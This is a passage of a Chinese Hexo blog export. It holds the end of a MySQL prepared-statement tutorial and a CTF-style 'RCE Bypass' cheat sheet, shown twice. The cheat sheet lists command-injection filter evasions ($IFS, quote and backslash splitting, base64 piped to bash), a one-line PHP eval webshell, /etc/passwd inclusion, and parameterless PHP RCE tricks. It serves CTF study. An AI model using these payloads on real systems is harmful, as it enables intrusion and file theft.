'max_prepared%';\n+-------------------------+-------+\n| Variable_name           | Value |\n+-------------------------+-------+\n| max_prepared_stmt_count | 16382 |\n+-------------------------+-------+\n1 row in set (0.00 sec)</code></pre><p> 　   预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"MySQL的SQL预处理-Prepared\"><a href=\"#MySQL的SQL预处理-Prepared\" class=\"headerlink\" title=\"MySQL的SQL预处理(Prepared)\"></a>MySQL的SQL预处理(Prepared)</h1><p>学习自<a href=\"https://www.cnblogs.com/geaozhang/p/9891338.html#a\" target=\"_blank\" rel=\"noopener\">MySQL的SQL预处理(Prepared)</a></p>\n<blockquote>\n<p>Prepared SQL Statement：SQL的执行、预编译处理语法、注意点</p>\n</blockquote>\n<p>[toc]</p>\n<h2 id=\"一、SQL-语句的执行处理\"><a href=\"#一、SQL-语句的执行处理\" class=\"headerlink\" title=\"一、SQL 语句的执行处理\"></a>一、SQL 语句的执行处理</h2><h3 id=\"1、即时-SQL\"><a href=\"#1、即时-SQL\" class=\"headerlink\" title=\"1、即时 SQL\"></a>1、即时 SQL</h3><p>一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>\n<ol>\n<li><p>词法和语义解析；</p>\n</li>\n<li><p>优化 SQL 语句，制定执行计划；</p>\n</li>\n<li><p>执行并返回结果；</p>\n</li>\n</ol>\n<p>​        如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p>\n<h3 id=\"2、预处理-SQL\"><a href=\"#2、预处理-SQL\" class=\"headerlink\" title=\"2、预处理 SQL\"></a>2、预处理 SQL</h3><p>​        但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>​        所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。</p>\n<p>​        预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>\n<p><strong>注意：</strong></p>\n<p>​        虽然可能是通过预处理 SQL 的方式一定程度的提高了效率，但是对于优化而言，最优的执行计划不是光靠 SQL 语句的模板化来实现的，往往还是需要通过具体值来预估出成本代价。</p>\n<h2 id=\"二、Prepared-SQL-Statement-Syntax\"><a href=\"#二、Prepared-SQL-Statement-Syntax\" class=\"headerlink\" title=\"二、Prepared SQL Statement Syntax\"></a>二、Prepared SQL Statement Syntax</h2><p>​        MySQL 官方将 prepare、execute、deallocate 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。<br>　　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。<br>语法：</p>\n<pre><code># 定义预处理语句\nPREPARE stmt_name FROM preparable_stmt;\n# 执行预处理语句\nEXECUTE stmt_name [USING @var_name [, @var_name] ...];\n# 删除(释放)定义\n{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><h3 id=\"1、利用字符串定义预处理-SQL-直角三角形计算\"><a href=\"#1、利用字符串定义预处理-SQL-直角三角形计算\" class=\"headerlink\" title=\"1、利用字符串定义预处理 SQL (直角三角形计算)\"></a>1、利用字符串定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; SET @a = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @b = 4;                                                   \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; EXECUTE stmt1 USING @a, @b;\n+------------+\n| hypotenuse |\n+------------+\n|          5 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt1;                                     \nQuery OK, 0 rows affected (0.00 sec)</code></pre><h3 id=\"2、利用变量定义预处理-SQL-直角三角形计算\"><a href=\"#2、利用变量定义预处理-SQL-直角三角形计算\" class=\"headerlink\" title=\"2、利用变量定义预处理 SQL (直角三角形计算)\"></a>2、利用变量定义预处理 SQL (直角三角形计算)</h3><pre><code>mysql&gt; SET @s = &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; PREPARE stmt2 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; SET @c = 6;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @d = 8;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; EXECUTE stmt2 USING @c, @d;\n+------------+\n| hypotenuse |\n+------------+\n|         10 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt2;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><h3 id=\"3、解决无法传参问题\"><a href=\"#3、解决无法传参问题\" class=\"headerlink\" title=\"3、解决无法传参问题\"></a>3、解决无法传参问题</h3><p>　　我们知道，对于 LIMIT 子句中的值，必须是常量，不得使用变量，也就是说不能使用：SELECT * FROM TABLE LIMIT @skip, @numrows; 如此，就可以是用 PREPARE 语句解决此问题。</p>\n<pre><code>mysql&gt; SET @skip = 100; SET @numrows = 3;\nQuery OK, 0 rows affected (0.00 sec)\n\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SELECT * FROM t1 LIMIT @skip, @numrows;\nERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;@skip, @numrows&#39; at line 1\n\nmysql&gt; PREPARE stmt3 FROM &quot;SELECT * FROM t1 LIMIT ?, ?&quot;;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; EXECUTE stmt3 USING @skip, @numrows;\n+-----+--------+\n| a   | filler |\n+-----+--------+\n| 100 | filler |\n| 101 | filler |\n| 102 | filler |\n+-----+--------+\n3 rows in set (0.00 sec)\n\nmysql&gt; DEALLOCATE PREPARE stmt3;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><p> 　   如此一来，结合2中介绍的利用变量定义预处理 SQL 也就基本解决了传参时语法报错问题了，类似的：用变量传参做表名时，MySQL 会把变量名当做表名，这样既不是本意，也会是语法错误，在 SQL Server 的解决办法是利用字符串拼接穿插变量进行传参，再将整条 SQL 语句作为变量，最后是用 sp_executesql 调用该拼接 SQL 执行，而 Prepared SQL Statement 可谓异曲同工之妙。</p>\n<pre><code>mysql&gt; SET @table = &#39;t2&#39;;\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; SET @s = CONCAT(&#39;SELECT * FROM &#39;, @table);\nQuery OK, 0 rows affected (0.00 sec)\n\nmysql&gt; PREPARE stmt4 FROM @s;\nQuery OK, 0 rows affected (0.00 sec)\nStatement prepared\n\nmysql&gt; EXECUTE stmt4;\n+------+-------+-------+\n| id   | score | grade |\n+------+-------+-------+\n|    1 |    99 | A     |\n|    2 |    81 | B     |\n|    3 |    55 | D     |\n|    4 |    69 | C     |\n+------+-------+-------+\n4 rows in set (0.00 sec)\n\nmysql&gt; DROP PREPARE stmt4;\nQuery OK, 0 rows affected (0.00 sec)</code></pre><h2 id=\"三、预处理-SQL-使用注意点\"><a href=\"#三、预处理-SQL-使用注意点\" class=\"headerlink\" title=\"三、预处理 SQL 使用注意点\"></a>三、预处理 SQL 使用注意点</h2><p>1、stmt_name 作为 preparable_stmt 的接收者，唯一标识，不区分大小写。<br>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。<br>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。<br>4、PREPARE stmt_name 的作用域是session级</p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/1113510-20181101192302151-157684852.png\" alt=\"img\"><br>　　可以通过 max_prepared_stmt_count 变量来控制全局最大的存储的预处理语句。</p>\n<pre><code>mysql&gt; show variables like &#39;max_prepared%&#39;;\n+-------------------------+-------+\n| Variable_name           | Value |\n+-------------------------+-------+\n| max_prepared_stmt_count | 16382 |\n+-------------------------+-------+\n1 row in set (0.00 sec)</code></pre><p> 　   预处理编译 SQL 是占用资源的，所以在使用后注意及时使用 DEALLOCATE PREPARE 释放资源，这是一个好习惯。</p>\n"},{"title":"RCE Bypass","date":"2021-09-10T06:01:10.561Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n# RCE Bypass\n\n参考[RCE漏洞之绕过](https://blog.csdn.net/loseheart157/article/details/109305380)\n\n## - 花括号\n\n`{}`\n\n在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令\n\n`{cat,flag}`\n\n## - 反斜杠\n\n路径`/`\n\n反斜杠`\\`是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。\n\n也就意味着，我们可以在rce漏洞，过滤掉`cat`、`ls`等命令时，使用`ca\\t`来实现绕过\n\n## - 空格过滤\n\n**注意:**在使用带有`$`的内容替换时，要注意用`\\`转义，因为`$`在php中有特殊含义\n\n```\n< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等\n```\n\n## - 一些命令分隔符\n\nlinux中：`%0a`（回车）、`%0d`（换行）、`;`、`&`、`|`、`&&`、`||`\n\nwindows中：`%0a`、`&`、`|`、`%1a`（一个神奇的角色，作为**.bat**文件中的命令分隔符）\n\n## - 黑名单绕过\n\n### -- 变量拼接绕过\n\n例如：\n\n```shell\na=l;b=s;$a$b\n```\n\n利用偶读拼接方法绕过黑名单：\n\n```shell\na=fl;b=ag;cat $a$b\n```\n\n利用.拼接绕过`(sy.(st).em)`\n\n使用内敛执行代替system\n\n```php\necho `ls`;\necho $(ls);\n?><?=`ls`;\n?><?=$(ls);\n<?=`ls /`;?>   #等效于<?php echo `ls /`;?>\n```\n\n### -- 编码绕过\n\n```\necho \"Y2F0IGZsYWc=\"|base64 -d|bash\n-d是解码，是base64解码\n\nxxd - r -p可以转换16进制，同样用户管道符之后。\n```\n\n### -- 单引号和双引号绕过\n\n```shell\n比如ca''t flag或cat\"\"t flag\n```\n\n### -- 利用shell特殊变量绕过\n\n使用`$*`和`$@`，`$x`(x代表1-9)，`${x}`(x>=10)。\n\nPS：因为在没有传参的情况下，上面的特殊变量都是为空的\n\n比如`ca$@t fla$@g`或者`ca$1t fla$2g`\n\n### -- linux中直接查看文件内容的工具\n\n```\n cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awk\nmore:一页一页的显示档案内容\nless:与 more 类似\nhead:查看头几行\ntac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\ntail:查看尾几行\nnl：显示的时候，顺便输出行号\nod:以二进制的方式读取档案内容\nvi:一种编辑器，这个也可以查看\nvim:一种编辑器，这个也可以查看\nsort:可以查看\nuniq:可以查看\nfile -f:报错出具体内容\n```\n\n假设该目录下有index.php和flag.php\n\n```shell\ncat `ls`\n```\n\n等同于\n\n```shell\ncat flag.php;cat index.php\n```\n\ncat新姿势/bin/?at\n\n### -- 文件构造\n\n在ctfhub文件包含中，有一个shell,txt,也就是文件\n我们令?file = shell.txt，已知shell.txt内容为\n\n<?php eval($_REQUEST['ctfhub']);?>\n\nrequest类型是由get和post构成的\n在post数据里输入\nctfhub=system(\"ls /\");\n就可以执行命令.\n\n\n\n## -- 无需括号的函数\n\n~~~php\n```php\n<?php\necho 666;\nprint 666;\ndie;\ninclude \"/etc/passwd\";\nrequire \"/etc/passwd\";\ninclude_once \"/etc/passwd\";\nrequire_once \"/etc/passwd\";\n~~~\n\n## -- 过滤单引号和双引号\n\n$_GET[1]\n\n$_POST[a]\n\n此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。\n\n## -- 无参数文件读取\n\n> 参考\n>\n> https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\n\n### 思路\n\n1. 利用超全局变量进行bypass,进行RCE\n2. 进行任意文件读取\n\n### 法一：localeconv()\n\n- highlight_file()\n\n  ![image-20210518200944707](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png)\n\n- 此函数用来获取`.`，在windows及linux中均表示当前目录\n\n  localeconv()函数返回包含本地数字及货币格式信息的数组\n\n  ![image-20210518174614995](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png)\n\n- scandir()函数用来列出指定路径中的文件和目录\n\n  ![image-20210518165817130](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png)\n\n- current()函数返回数组中的当前元素(单元)，默认取第一个值\n\n- pos()同current()，是current()的别名\n\n- reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE\n\n  构造如下：\n\n  ```php\n  print_r(scandir(current(localeconv())));\n  print_r(scandir(pos(localeconv())));\n  print_r(scandir(reset(localeconv())));\n  ```\n\n### 法二（待完善）:getenv()\n\n**注意**：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数![image-20210518190014039](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png)![image-20210518185825681](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png)\n\nphp常见超全局变量\n\n```php\n$GLOBALS\n$_SERVER\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n$_SESSION\n$_REQUEST\n$_ENV\n```\n\n这里可以使用`$_ENV`，对应函数为`getenv()`\n\n![image-20210518162644882](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png)\n\n但如何从数组中取出指定值，这里可以使用方法：![image-20210518162756460](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png)\n\n结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。\n\n### 法三：getallheaders()\n\n**限制**：getallheaders()为apache函数，目标中间件必须为apache。\n\n![image-20210518192151719](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png)\n\n返回值\n\n```php\narray(13) { \n\t[\"Cookie\"]=> string(36) \"PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv\" \n\t[\"Accept-Language\"]=> string(14) \"en-US,en;q=0.9\" \n\t[\"Accept-Encoding\"]=> string(17) \"gzip, deflate, br\" \n\t[\"Sec-Fetch-Dest\"]=> string(8) \"document\" \n\t[\"Sec-Fetch-Mode\"]=> string(8) \"navigate\" \n\t[\"Sec-Fetch-Site\"]=> string(10) \"cross-site\" \n\t[\"Accept\"]=> string(135) \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" \n\t[\"User-Agent\"]=> string(115) \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\" \n\t[\"Upgrade-Insecure-Requests\"]=> string(1) \"1\" \n\t[\"Sec-Ch-Ua-Mobile\"]=> string(2) \"?0\" \n\t[\"Sec-Ch-Ua\"]=> string(64) \"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"\" \n\t[\"Connection\"]=> string(5) \"close\" \n\t[\"Host\"]=> string(9) \"127.0.0.1\" \n}\n```\n\n通过修改request包，进行简单爆破就能获取指定位置的恶意参数\n\n![image-20210518200344715](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png)\n\n### 法四：get_defined_vars()\n\n利用get_defined_vars()使用范围更广一些。\n\n查看回显\n\n![image-20210518203122147](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png)\n\n发现其可以回显全局变量\n\n```php\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n```\n\n这里的选择也就具有多样性，可以利用`$_GET`进行RCE，如下![image-20210518203341256](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png)\n\n将其参数取出\n\n![image-20210518203719246](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png)\n\n可以成功RCE\n\n# 异或 取反 自增 按位或 按位与\n\n先记录这么个思路，待实践。\n\n","source":"_posts/RCE Bypass.md","raw":"---\ntitle: RCE Bypass\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: RCE\ncategories: RCE\n---\n\n# RCE Bypass\n\n参考[RCE漏洞之绕过](https://blog.csdn.net/loseheart157/article/details/109305380)\n\n## - 花括号\n\n`{}`\n\n在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令\n\n`{cat,flag}`\n\n## - 反斜杠\n\n路径`/`\n\n反斜杠`\\`是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。\n\n也就意味着，我们可以在rce漏洞，过滤掉`cat`、`ls`等命令时，使用`ca\\t`来实现绕过\n\n## - 空格过滤\n\n**注意:**在使用带有`$`的内容替换时，要注意用`\\`转义，因为`$`在php中有特殊含义\n\n```\n< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等\n```\n\n## - 一些命令分隔符\n\nlinux中：`%0a`（回车）、`%0d`（换行）、`;`、`&`、`|`、`&&`、`||`\n\nwindows中：`%0a`、`&`、`|`、`%1a`（一个神奇的角色，作为**.bat**文件中的命令分隔符）\n\n## - 黑名单绕过\n\n### -- 变量拼接绕过\n\n例如：\n\n```shell\na=l;b=s;$a$b\n```\n\n利用偶读拼接方法绕过黑名单：\n\n```shell\na=fl;b=ag;cat $a$b\n```\n\n利用.拼接绕过`(sy.(st).em)`\n\n使用内敛执行代替system\n\n```php\necho `ls`;\necho $(ls);\n?><?=`ls`;\n?><?=$(ls);\n<?=`ls /`;?>   #等效于<?php echo `ls /`;?>\n```\n\n### -- 编码绕过\n\n```\necho \"Y2F0IGZsYWc=\"|base64 -d|bash\n-d是解码，是base64解码\n\nxxd - r -p可以转换16进制，同样用户管道符之后。\n```\n\n### -- 单引号和双引号绕过\n\n```shell\n比如ca''t flag或cat\"\"t flag\n```\n\n### -- 利用shell特殊变量绕过\n\n使用`$*`和`$@`，`$x`(x代表1-9)，`${x}`(x>=10)。\n\nPS：因为在没有传参的情况下，上面的特殊变量都是为空的\n\n比如`ca$@t fla$@g`或者`ca$1t fla$2g`\n\n### -- linux中直接查看文件内容的工具\n\n```\n cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awk\nmore:一页一页的显示档案内容\nless:与 more 类似\nhead:查看头几行\ntac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\ntail:查看尾几行\nnl：显示的时候，顺便输出行号\nod:以二进制的方式读取档案内容\nvi:一种编辑器，这个也可以查看\nvim:一种编辑器，这个也可以查看\nsort:可以查看\nuniq:可以查看\nfile -f:报错出具体内容\n```\n\n假设该目录下有index.php和flag.php\n\n```shell\ncat `ls`\n```\n\n等同于\n\n```shell\ncat flag.php;cat index.php\n```\n\ncat新姿势/bin/?at\n\n### -- 文件构造\n\n在ctfhub文件包含中，有一个shell,txt,也就是文件\n我们令?file = shell.txt，已知shell.txt内容为\n\n<?php eval($_REQUEST['ctfhub']);?>\n\nrequest类型是由get和post构成的\n在post数据里输入\nctfhub=system(\"ls /\");\n就可以执行命令.\n\n\n\n## -- 无需括号的函数\n\n~~~php\n```php\n<?php\necho 666;\nprint 666;\ndie;\ninclude \"/etc/passwd\";\nrequire \"/etc/passwd\";\ninclude_once \"/etc/passwd\";\nrequire_once \"/etc/passwd\";\n~~~\n\n## -- 过滤单引号和双引号\n\n$_GET[1]\n\n$_POST[a]\n\n此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。\n\n## -- 无参数文件读取\n\n> 参考\n>\n> https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\n\n### 思路\n\n1. 利用超全局变量进行bypass,进行RCE\n2. 进行任意文件读取\n\n### 法一：localeconv()\n\n- highlight_file()\n\n  ![image-20210518200944707](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png)\n\n- 此函数用来获取`.`，在windows及linux中均表示当前目录\n\n  localeconv()函数返回包含本地数字及货币格式信息的数组\n\n  ![image-20210518174614995](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png)\n\n- scandir()函数用来列出指定路径中的文件和目录\n\n  ![image-20210518165817130](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png)\n\n- current()函数返回数组中的当前元素(单元)，默认取第一个值\n\n- pos()同current()，是current()的别名\n\n- reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE\n\n  构造如下：\n\n  ```php\n  print_r(scandir(current(localeconv())));\n  print_r(scandir(pos(localeconv())));\n  print_r(scandir(reset(localeconv())));\n  ```\n\n### 法二（待完善）:getenv()\n\n**注意**：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数![image-20210518190014039](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png)![image-20210518185825681](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png)\n\nphp常见超全局变量\n\n```php\n$GLOBALS\n$_SERVER\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n$_SESSION\n$_REQUEST\n$_ENV\n```\n\n这里可以使用`$_ENV`，对应函数为`getenv()`\n\n![image-20210518162644882](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png)\n\n但如何从数组中取出指定值，这里可以使用方法：![image-20210518162756460](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png)\n\n结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。\n\n### 法三：getallheaders()\n\n**限制**：getallheaders()为apache函数，目标中间件必须为apache。\n\n![image-20210518192151719](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png)\n\n返回值\n\n```php\narray(13) { \n\t[\"Cookie\"]=> string(36) \"PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv\" \n\t[\"Accept-Language\"]=> string(14) \"en-US,en;q=0.9\" \n\t[\"Accept-Encoding\"]=> string(17) \"gzip, deflate, br\" \n\t[\"Sec-Fetch-Dest\"]=> string(8) \"document\" \n\t[\"Sec-Fetch-Mode\"]=> string(8) \"navigate\" \n\t[\"Sec-Fetch-Site\"]=> string(10) \"cross-site\" \n\t[\"Accept\"]=> string(135) \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\" \n\t[\"User-Agent\"]=> string(115) \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\" \n\t[\"Upgrade-Insecure-Requests\"]=> string(1) \"1\" \n\t[\"Sec-Ch-Ua-Mobile\"]=> string(2) \"?0\" \n\t[\"Sec-Ch-Ua\"]=> string(64) \"\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"\" \n\t[\"Connection\"]=> string(5) \"close\" \n\t[\"Host\"]=> string(9) \"127.0.0.1\" \n}\n```\n\n通过修改request包，进行简单爆破就能获取指定位置的恶意参数\n\n![image-20210518200344715](C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png)\n\n### 法四：get_defined_vars()\n\n利用get_defined_vars()使用范围更广一些。\n\n查看回显\n\n![image-20210518203122147](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png)\n\n发现其可以回显全局变量\n\n```php\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n```\n\n这里的选择也就具有多样性，可以利用`$_GET`进行RCE，如下![image-20210518203341256](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png)\n\n将其参数取出\n\n![image-20210518203719246](https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png)\n\n可以成功RCE\n\n# 异或 取反 自增 按位或 按位与\n\n先记录这么个思路，待实践。\n\n","slug":"RCE Bypass","published":1,"updated":"2021-07-27T03:35:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydt000qt8op2i7x7r9q","content":"<h1 id=\"RCE-Bypass\"><a href=\"#RCE-Bypass\" class=\"headerlink\" title=\"RCE Bypass\"></a>RCE Bypass</h1><p>参考<a href=\"https://blog.csdn.net/loseheart157/article/details/109305380\" target=\"_blank\" rel=\"noopener\">RCE漏洞之绕过</a></p>\n<h2 id=\"花括号\"><a href=\"#花括号\" class=\"headerlink\" title=\"- 花括号\"></a>- 花括号</h2><p><code>{}</code></p>\n<p>在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令</p>\n<p><code>{cat,flag}</code></p>\n<h2 id=\"反斜杠\"><a href=\"#反斜杠\" class=\"headerlink\" title=\"- 反斜杠\"></a>- 反斜杠</h2><p>路径<code>/</code></p>\n<p>反斜杠<code>\\</code>是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。</p>\n<p>也就意味着，我们可以在rce漏洞，过滤掉<code>cat</code>、<code>ls</code>等命令时，使用<code>ca\\t</code>来实现绕过</p>\n<h2 id=\"空格过滤\"><a href=\"#空格过滤\" class=\"headerlink\" title=\"- 空格过滤\"></a>- 空格过滤</h2><p><strong>注意:</strong>在使用带有<code>$</code>的内容替换时，要注意用<code>\\</code>转义，因为<code>$</code>在php中有特殊含义</p>\n<pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</code></pre><h2 id=\"一些命令分隔符\"><a href=\"#一些命令分隔符\" class=\"headerlink\" title=\"- 一些命令分隔符\"></a>- 一些命令分隔符</h2><p>linux中：<code>%0a</code>（回车）、<code>%0d</code>（换行）、<code>;</code>、<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code></p>\n<p>windows中：<code>%0a</code>、<code>&amp;</code>、<code>|</code>、<code>%1a</code>（一个神奇的角色，作为<strong>.bat</strong>文件中的命令分隔符）</p>\n<h2 id=\"黑名单绕过\"><a href=\"#黑名单绕过\" class=\"headerlink\" title=\"- 黑名单绕过\"></a>- 黑名单绕过</h2><h3 id=\"–-变量拼接绕过\"><a href=\"#–-变量拼接绕过\" class=\"headerlink\" title=\"– 变量拼接绕过\"></a>– 变量拼接绕过</h3><p>例如：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">a=l;b=s;$a$b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>利用偶读拼接方法绕过黑名单：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">a=fl;b=ag;cat $a$b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>利用.拼接绕过<code>(sy.(st).em)</code></p>\n<p>使用内敛执行代替system</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token keyword\">echo</span> `ls`<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> $<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span class=\"token delimiter\">&lt;?</span><span class=\"token operator\">=</span>`ls`<span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">?></span><span class=\"token delimiter\">&lt;?</span><span class=\"token operator\">=</span>$<span class=\"token punctuation\">(</span>ls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter\">&lt;?</span><span class=\"token operator\">=</span>`ls <span class=\"token operator\">/</span>`<span class=\"token punctuation\">;</span><span class=\"token delimiter\">?></span>   <span class=\"token shell-comment comment\">#等效于&lt;?php echo `ls /`;?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"–-编码绕过\"><a href=\"#–-编码绕过\" class=\"headerlink\" title=\"– 编码绕过\"></a>– 编码绕过</h3><pre><code>echo \"Y2F0IGZsYWc=\"|base64 -d|bash\n-d是解码，是base64解码\n\nxxd - r -p可以转换16进制，同样用户管道符之后。</code></pre><h3 id=\"–-单引号和双引号绕过\"><a href=\"#–-单引号和双引号绕过\" class=\"headerlink\" title=\"– 单引号和双引号绕过\"></a>– 单引号和双引号绕过</h3><pre class=\"line-numbers language-shell\"><code class=\"language-shell\">比如ca''t flag或cat\"\"t flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"–-利用shell特殊变量绕过\"><a href=\"#–-利用shell特殊变量绕过\" class=\"headerlink\" title=\"– 利用shell特殊变量绕过\"></a>– 